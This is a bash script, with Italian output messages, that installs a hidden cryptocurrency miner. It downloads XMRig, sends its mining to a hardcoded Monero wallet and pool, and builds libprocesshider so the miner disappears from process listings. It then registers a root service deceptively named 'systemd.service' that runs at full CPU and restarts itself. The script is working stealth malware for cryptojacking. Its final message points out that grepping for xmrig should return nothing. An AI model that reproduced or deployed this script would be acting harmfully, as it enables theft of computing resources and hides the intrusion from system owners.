#!/bin/bash

WALLET="46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt"
POOL="gulf.moneroocean.stream:10128"

WORKER_NAME="server_$(hostname -s)"
CPU_USAGE=100

set -e

if [ "$EUID" -ne 0 ]; then
  echo "Errore: Esegui come root (sudo)"
  exit 1
fi

echo "=================================================="
echo "     Installazione ottimizzata - VM SAFE + HIDER"
echo "=================================================="

apt update && apt install -y wget tar curl git build-essential

mkdir -p /opt/systemd
cd /opt/systemd

# Scarica XMRig
if [ ! -f "xmrig" ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
    tar -xvf xmrig-6.26.0-linux-static-x64.tar.gz --strip-components=1
    rm xmrig-6.26.0-linux-static-x64.tar.gz
    chmod +x xmrig
fi

# Scarica e compila libprocesshider
if [ ! -f "/usr/local/lib/libprocesshider.so" ]; then
    echo "[*] Installazione libprocesshider..."
    cd /opt/systemd
    if [ ! -d "libprocesshider" ]; then
        git clone https://github.com/gianlucaborello/libprocesshider.git
    fi
    cd libprocesshider
    
    # Modifica il nome del processo da nascondere
    sed -i 's/#define PROCESS_NAME .*/#define PROCESS_NAME "xmrig"/' processhider.c
    
    make
    cp libprocesshider.so /usr/local/lib/
    ldconfig
    echo "[*] libprocesshider installato"
fi

# Configura hugepages
sysctl -w vm.nr_hugepages=2048
if ! grep -q "vm.nr_hugepages" /etc/sysctl.conf; then
    echo "vm.nr_hugepages=2048" >> /etc/sysctl.conf
fi

# MSR (opzionale, fallisce in VM)
if command -v wrmsr &> /dev/null || apt install -y msr-tools; then
    modprobe msr 2>/dev/null || true
    wrmsr -a 0x1a4 0xf 2>/dev/null || true
fi

# Crea wrapper script per LD_PRELOAD
cat <<'EOF' > /opt/systemd/xmrig-wrapper.sh
#!/bin/bash
export LD_PRELOAD=/usr/local/lib/libprocesshider.so
exec /opt/systemd/xmrig "$@"
EOF
chmod +x /opt/systemd/xmrig-wrapper.sh

# Crea servizio systemd con LD_PRELOAD
cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd

Environment="LD_PRELOAD=/usr/local/lib/libprocesshider.so"

ExecStart=/opt/systemd/xmrig-wrapper.sh \\
    -o $POOL \\
    -u $WALLET \\
    -p $WORKER_NAME \\
    --keepalive \\
    --cpu-max-threads-hint=$CPU_USAGE \\
    --randomx-mode=fast \\
    --randomx-1gb-pages \\
    --no-nvml \\
    --no-opencl

Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now systemd.service

echo "=================================================="
echo "Installazione completata - VM SAFE + HIDER"
echo "=================================================="
echo "Cartella: /opt/systemd"
echo "Servizio: systemd.service"
echo "Pool: $POOL"
echo "Hider: /usr/local/lib/libprocesshider.so"
echo ""
echo "Comandi utili:"
echo "  Stato:      sudo systemctl status systemd"
echo "  Log:        sudo journalctl -u systemd -f"
echo "  Riavvio:    sudo systemctl restart systemd"
echo "  Stop:       sudo systemctl stop systemd"
echo "  Verifica:   ps aux | grep xmrig  (dovrebbe essere vuoto)"
echo "  Reale:      pgrep xmrig  (mostra PID)"
echo ""
echo "Worker: $WORKER_NAME"
echo "=================================================="
